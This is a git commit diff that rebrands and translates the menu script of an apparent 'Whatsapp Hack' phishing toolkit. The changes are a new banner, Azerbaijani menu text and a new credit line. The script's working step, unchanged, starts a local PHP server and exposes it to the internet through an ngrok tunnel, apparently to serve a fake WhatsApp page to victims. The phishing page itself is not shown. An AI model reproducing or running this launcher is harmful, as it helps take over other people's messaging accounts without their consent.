db18357d48c2e8cf872a0ab2b23953780400a056
Nihat 「 FARZ 」 <99778063+NihatFarz@users.noreply.github.com>
2022-03-09 01:17:37 +0400

    「 FARZ 」

--- Site/Whatsapp/start.sh
+++ Site/Whatsapp/start.sh
@@ -2,48 +2,47 @@
 
 clear
 echo -e '\033[32;40;1m
-        /\︵-︵/\
-        |( ◉)(◉)|
-        \ ︶V︶ /
-        /↺↺↺↺↺↺↺\
-        ↺↺↺↺↺↺↺↺|
-        \↺↺↺↺↺↺↺/
-        ¯¯/\¯/\¯¯
+      ███████╗ █████╗ ██████╗ ███████╗
+      ██╔════╝██╔══██╗██╔══██╗╚══███╔╝
+      █████╗  ███████║██████╔╝  ███╔╝ 
+      ██╔══╝  ██╔══██║██╔══██╗ ███╔╝  
+      ██║     ██║  ██║██║  ██║███████╗
+      ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝
 
 
 
 \033[31;40;1m[01]\e[37mWhatsapp Hack 
 
 
-\e[31m[00]\e[37m Menü
-\e[31m[99]\e[37m Exit
+\e[31m[00]\e[37m Menyu
+\e[31m[99]\e[37m Çıxış
 
  '
-echo -e "\033[32;40;1m                      ~~~Yaman Efkar~~~"
+echo -e "\033[32;40;1m                      ~~~Nihat 「 FARZ 」~~~"
 echo ""
-read -p "İslem Numarası : " islem
+read -p "Seçim Edin : " islem
 if [[ $islem == 1 || $islem == 01 ]]; then
-read -p "Port Numarası Giriniz : " port
+read -p "Port Nömrəsi Girin : " port
 sleep 3
 echo ""
 echo -e "\e[33mCode: whatsapp01"
 sleep 2
 echo ""
-echo -e "\e[33mPhp Server && Ngrok Service Başlatılıyor..."
+echo -e "\e[33mPhp Server && Ngrok Service Başladılır..."
 sleep 4
 cd Site/
 php -S 127.0.0.1:$port > -t & ngrok http $port
 elif [[ $islem == 9 || $islem == 99 ]]; then
 clear
-echo -e "\e[31mTürk Siber Timi İyi Günler Diler :)) ßß"
+echo -e "\e[31mKanalımızı İzləmədə qalın @MaragliWeb :)) ßß"
 sleep 1 
 exit 1
 elif [[ $islem == 00 ]]; then
 cd ..
 cd ..
-bash tst.sh
+bash farz.sh
 else 
-	echo -e '\033[31;40;1m İslem Numaranızı Kontrol Ediniz!'
+	echo -e '\033[31;40;1m Seçiminizi düzgün edin!'
 	sleep 2
 	clear
 	bash start.sh
